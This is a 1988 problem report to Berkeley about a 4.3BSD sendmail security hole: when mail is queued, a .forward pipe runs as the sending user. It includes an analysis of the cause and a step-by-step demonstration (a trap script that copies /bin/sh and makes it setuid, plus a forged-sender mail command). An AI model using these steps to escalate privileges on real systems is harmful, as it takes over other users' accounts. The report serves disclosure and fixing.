@@ -1,0 +1,144 @@
+From wombat%vger@xenurus.Gould.COM  Thu Apr  7 13:51:58 1988
+To: bugs@okeeffe.Berkeley.EDU
+Subject: sendmail security hole
+Date: Thu, 07 Apr 88 15:50:54 -0500
+From: Joan Eslinger <wombat%vger@xenurus.Gould.COM>
+Index: usr.lib/sendmail 4.3BSD
+
+This is a problem report of a security bug in sendmail that was sent to
+us by a customer, including how to demonstrate the problem. Preceding it
+is an analysis of the underlying problem written by someone here. Since
+fixing it seems to require a change in the semantics of sendmail we
+would like some feedback from Berkeley and/or the world at large first.
+I couldn't find a report of this problem already in the bug archive.
+
+----------------------------------------------------------------------
+ANALYSIS:
+
+This is non-trivial.  This is what happens:
+
+Sendmail takes the contents of the .forward file and replaces the
+original recipient with it in the material that goes on the queue.
+
+When (another, different) sendmail comes along later to run the queue,
+it takes the entry off the queue and hands it to /usr/ucb/Mail to
+deliver.  Mail sees the piped-to recipient and stuffs the mail into
+it.  Note that the pipe IS the recipient, so there's no way for it to
+execute as the original recipient -- it no longer knows who the original
+recipient is.
+
+The solution would have to involve either passing the original recipient
+along or running as some other, pre-defined, special user known to
+have no privileges.  The latter would make the forward to pipe method
+pretty useless.  Alternatively, the delivery to pipes method could
+simply be cut out, which would also make people unhappy.
+
+----------------------------------------------------------------------
+PROBLEM REPORT:
+
+There's a big security leak caused by a setuid problem within sendmail.
+This security problem will only appear when the mail gets queued.
+
+This security bug is generic in BSD4.3.
+
+Test Procedure
+===============
+
+STEP 1
+======
+First make sure the mail gets queued, to achieve this do the following:
+
+# default delivery mode (deliver in background)
+Odbackground
+
+to
+
+# default delivery mode
+Odqueue
+
+If you have a frozen cnfiguration file, delete it or refreeze it.
+-----------------------------------------------------------------
+STEP 2
+======
+
+   User A has a .forward file which invokes a script named 'trap':      
+   $cat .forward
+   "|/tmp/trap"
+
+    The script 'trap' contains:
+    $cat /tmp/trap
+    cp /bin/sh /tmp/newsh
+    chmod u+s /tmp/newsh
+-----------------------------------------------------------------
+STEP 3
+======
+
+   THERE ARE TWO FLAVORS HERE, THE RESULT IN EITHER CASE IS THE SAME
+
+   FLAVOR 1
+   ========
+   User B sends some mail to user A. The following happens:
+
+   1. sendmail runs because of the -v (verbose) flag directly.
+      If this's the case script 'trap' executes setuid A.
+      This is exactly what I want and is perfectly ok.
+
+   2. the mail gets queued, since sendmail.cf says so OR the load
+      figure is too high, and the mail will be delivered later.
+      If this is the case:
+      Script 'trap' runs setuid B.  And that's really something I
+      don't want to happen. Because it should execute as setuid A
+      and not as B.                                             
+
+   FLAVOR 2
+   ========
+   User A doesn't want to wait till User B sends him some mail. So he
+   does the following :
+
+   $mail UserA -f hostname!UserB
+    Subject: trap UserB 
+    Within seconds I will have the effective UID of UserB
+    and I can do everything I want....
+    .
+    cc:
+
+   The results of this are :
+
+   2. the mail gets queued, since sendmail.cf says so OR the load
+      figure is to high, and the mail will be delivered later.
+      If this is the case :
+      script 'trap' runs setuid B.  And that's really something I 
+      don't want to happen. Because it should execute as setuid A
+      and not as B.                                             
+-----------------------------------------------------------------
+STEP 4
+======
+
+   Type the following :
+
+   $/tmp/newsh
+
+   Your imagination will do the rest.
+-----------------------------------------------------------------
+
+The impact of this problem is dramatic as you can understand.
+So if user A want to do some harm to user B he has to do two
+things :
+	1. User A will Put a .forward file in his own home 
+	   directory.
+	   This .forward file contains the following :
+
+	     "|/tmp/trap"
+
+	   And the script 'trap' will contain :
+
+	     cp /bin/sh /tmp/newsh
+	     chmod u+s /tmp/newsh
+
+	2. Wait for the mail from user B since the script 'trap'
+	   will be executed setuid 'B'.
+
+	After that user A can do whatever he wants do with user B
+	his files.
+
+----------------------------------------------------------------------
